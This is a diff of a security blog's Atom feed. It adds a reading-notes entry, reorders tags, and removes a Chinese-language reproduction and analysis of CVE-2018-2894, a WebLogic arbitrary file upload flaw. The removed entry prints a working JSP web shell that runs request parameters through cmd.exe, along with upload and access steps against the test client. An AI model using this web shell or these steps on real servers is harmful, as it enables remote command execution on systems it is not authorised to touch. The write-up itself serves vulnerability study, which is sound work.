@@ -242,6 +242,37 @@
   </entry>
   
   <entry>
+    <title>《蓝队视角下的防御体系突破》.xmind</title>
+    <link href="http://chybeta.github.io/2021/08/30/%E3%80%8A%E8%93%9D%E9%98%9F%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E9%98%B2%E5%BE%A1%E4%BD%93%E7%B3%BB%E7%AA%81%E7%A0%B4%E3%80%8B-xmind/"/>
+    <id>http://chybeta.github.io/2021/08/30/《蓝队视角下的防御体系突破》-xmind/</id>
+    <published>2021-08-30T14:30:36.000Z</published>
+    <updated>2021-08-30T14:36:57.111Z</updated>
+    
+    <content type="html"><![CDATA[<p>拜读一下奇安信的《蓝队视角下的防御体系突破》，简单做个笔记。</p>
+<p><img src="蓝队视角下的防御体系突破.png" alt="蓝队视角下的防御体系突破.png"></p>
+<p>XMind: <a href="蓝队视角下的防御体系突破.xmind">蓝队视角下的防御体系突破.xmind</a></p>
+<p>PDF: <a href="蓝队视角下的防御体系突破.pdf">蓝队视角下的防御体系突破.PDF</a></p>
+<p>侵删。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;拜读一下奇安信的《蓝队视角下的防御体系突破》，简单做个笔记。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;蓝队视角下的防御体系突破.png&quot; alt=&quot;蓝队视角下的防御体系突破.png&quot;&gt;&lt;/p&gt;
+&lt;p&gt;XMind: &lt;a href=&quot;蓝队视角下的防御体系突破.xmind&quot;&gt;蓝队视角
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
+    
+    
+      <category term="渗透测试" scheme="http://chybeta.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+      <category term="读书笔记" scheme="http://chybeta.github.io/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
+    
+  </entry>
+  
+  <entry>
     <title>【CVE-2019-16759】:pre-auth RCE in vBulletin 5.x</title>
     <link href="http://chybeta.github.io/2019/09/28/%E3%80%90CVE-2019-16759%E3%80%91-pre-auth-RCE-in-vBulletin-5-x/"/>
     <id>http://chybeta.github.io/2019/09/28/【CVE-2019-16759】-pre-auth-RCE-in-vBulletin-5-x/</id>
@@ -1644,9 +1675,9 @@
       <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    
       <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
     
       <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
     
@@ -1985,61 +2016,6 @@
       <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
     
       <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</title>
-    <link href="http://chybeta.github.io/2018/07/21/WebLogic%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-2894-%E3%80%91/"/>
-    <id>http://chybeta.github.io/2018/07/21/WebLogic任意文件上传漏洞复现与分析-【CVE-2018-2894-】/</id>
-    <published>2018-07-21T13:15:05.000Z</published>
-    <updated>2018-07-21T13:17:14.331Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2458" target="_blank" rel="external">WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】</a><br><a id="more"></a></p>
-<h1 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h1><p>漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3</p>
-<p>下载地址：<a href="http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip" target="_blank" rel="external">http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip</a></p>
-<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>服务启动后，访问 <a href="http://localhost:7001/ws_utc/config.do" target="_blank" rel="external">http://localhost:7001/ws_utc/config.do</a></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1cfa6d78-8b3d-1.png" alt="1.jpg"></p>
-<p>可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到<code>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war</code>下</p>
-<p>选择右边的<code>安全</code>栏目，添加<code>JKS Keystores</code>上传文件。假设<code>chybeta.jsp</code>内容如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">&lt;%@ page import="java.util.*,java.io.*,java.net.*"%&gt;</div><div class="line">&lt;HTML&gt;&lt;BODY&gt;</div><div class="line">&lt;FORM METHOD="POST" NAME="myform" ACTION=""&gt;</div><div class="line">&lt;INPUT TYPE="text" NAME="cmd"&gt;</div><div class="line">&lt;INPUT TYPE="submit" VALUE="Send"&gt;</div><div class="line">&lt;/FORM&gt;</div><div class="line">&lt;pre&gt;</div><div class="line">&lt;%</div><div class="line">if (request.getParameter("cmd") != null) &#123;</div><div class="line">        out.println("Command: " + request.getParameter("cmd") + "\n&lt;BR&gt;");</div><div class="line">        Process p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("cmd"));</div><div class="line">        OutputStream os = p.getOutputStream();</div><div class="line">        InputStream in = p.getInputStream();</div><div class="line">        DataInputStream dis = new DataInputStream(in);</div><div class="line">        String disr = dis.readLine();</div><div class="line">        while ( disr != null ) &#123;</div><div class="line">                out.println(disr); disr = dis.readLine(); &#125;</div><div class="line">        &#125;</div><div class="line">%&gt;</div><div class="line">&lt;/pre&gt;</div><div class="line">&lt;/BODY&gt;&lt;/HTML&gt;</div></pre></td></tr></table></figure></p>
-<p>抓包获取到时间戳为<code>1531987145013</code>，则上传到的位置即<code>config\keystore\1531987145013_chybeta.jsp</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d2762a6-8b3d-1.png" alt="2.jpg"></p>
-<p>访问<code>http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp</code></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180719181843-1d3c553a-8b3d-1.png" alt="3.jpg"></p>
-<h1 id="简要漏洞分析"><a href="#简要漏洞分析" class="headerlink" title="简要漏洞分析"></a>简要漏洞分析</h1><p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeWorkDir</span><span class="params">(String path)</span> </span>&#123;</div><div class="line">    String[] oldPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.testPageProvider.getWsImplType() == ImplType.JRF) &#123;</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">false</span>;</div><div class="line">        <span class="keyword">this</span>.isWorkDirWritable = isDirWritable(path);</div><div class="line">        <span class="keyword">this</span>.isWorkDirChangeable = <span class="keyword">true</span>;</div><div class="line">        <span class="keyword">this</span>.setTestClientWorkDir(path);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">this</span>.persistWorkDir(path);</div><div class="line">        <span class="keyword">this</span>.init();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.isWorkDirWritable) &#123;</div><div class="line">        String[] newPaths = <span class="keyword">this</span>.getRelatedPaths();</div><div class="line">        moveDirs(oldPaths, newPaths);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        Logger.fine(<span class="string">"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path."</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>此函数用于改变工作目录，但其中并未做任何检测。</p>
-<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181</code>中：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">@Path</span>(<span class="string">"/keystore"</span>)</div><div class="line"><span class="meta">@POST</span></div><div class="line"><span class="meta">@Produces</span>(&#123;<span class="string">"application/xml"</span>, <span class="string">"application/json"</span>&#125;)</div><div class="line"><span class="meta">@Consumes</span>(&#123;<span class="string">"multipart/form-data"</span>&#125;)</div><div class="line"><span class="function"><span class="keyword">public</span> Response <span class="title">editKeyStoreSettingByMultiPart</span><span class="params">(FormDataMultiPart formPartParams)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (!RequestUtil.isRequstedByAdmin(<span class="keyword">this</span>.request)) &#123;</div><div class="line">        <span class="keyword">return</span> Response.status(Status.FORBIDDEN).build();</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">if</span> (TestClientRT.isVerbose()) &#123;</div><div class="line">            Logger.fine(<span class="string">"calling SettingResource.addKeyStoreSettingByMultiPart"</span>);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        String currentTimeValue = <span class="string">""</span> + (<span class="keyword">new</span> Date()).getTime();</div><div class="line">        KeyValuesMap&lt;String, String&gt; formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, <span class="keyword">true</span>, TestClientRT.getKeyStorePath(), currentTimeValue);</div><div class="line">        ....</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>跟入<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getKeyStorePath</span><span class="params">()</span> </span>&#123;</div><div class="line">    <span class="keyword">return</span> getConfigDir() + File.separator + <span class="string">"keystore"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>得到要写入的路径<code>storePath</code>。</p>
-<p>在<code>ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145</code>:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> KeyValuesMap&lt;String, String&gt; <span class="title">convertFormDataMultiPart</span><span class="params">(FormDataMultiPart formPartParams, <span class="keyword">boolean</span> isExtactAttachment, String path, String fileNamePrefix)</span> </span>&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() &gt; <span class="number">0</span>) &#123;</div><div class="line">        <span class="keyword">if</span> (attachName != <span class="keyword">null</span> &amp;&amp; attachName.trim().length() != <span class="number">0</span>) &#123;</div><div class="line">            attachName = <span class="keyword">this</span>.refactorAttachName(attachName);</div><div class="line">            <span class="keyword">if</span> (fileNamePrefix == <span class="keyword">null</span>) &#123;</div><div class="line">                fileNamePrefix = key;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            String filename = (<span class="keyword">new</span> File(storePath, fileNamePrefix + <span class="string">"_"</span> + attachName)).getAbsolutePath();</div><div class="line">            kvMap.addValue(key, filename);</div><div class="line">            <span class="keyword">if</span> (isExtactAttachment) &#123;</div><div class="line">                <span class="keyword">this</span>.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125; </div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>把上传文件的内容传到了<code>storePath</code>目录里，文件名满足<code>fileNamePrefix + &quot;_&quot; + attachName</code>。这过程没有任何过滤和检查：）…</p>
-<p>条件：</p>
-<ul>
-<li>需要知道部署应用的web目录</li>
-<li><code>ws_utc/config.do</code>在开发模式下无需认证，在生产模式下需要认证。具体可见<a href="https://docs.oracle.com/middleware/1212/owsm/WSSEC/webservice-test.htm#WSSEC3642" target="_blank" rel="external">Oracle® Fusion Middleware Administering Web Services</a></li>
-</ul>
-<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
-<li><a href="http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html</a></li>
-<li><a href="https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/y5JGmM-aNaHcs_6P9a-gRQ</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2458&quot;&gt;WebLogic任意文件上传漏洞复现与分析 -【CVE-2018-2894 】&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-      <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
     
   </entry>
   
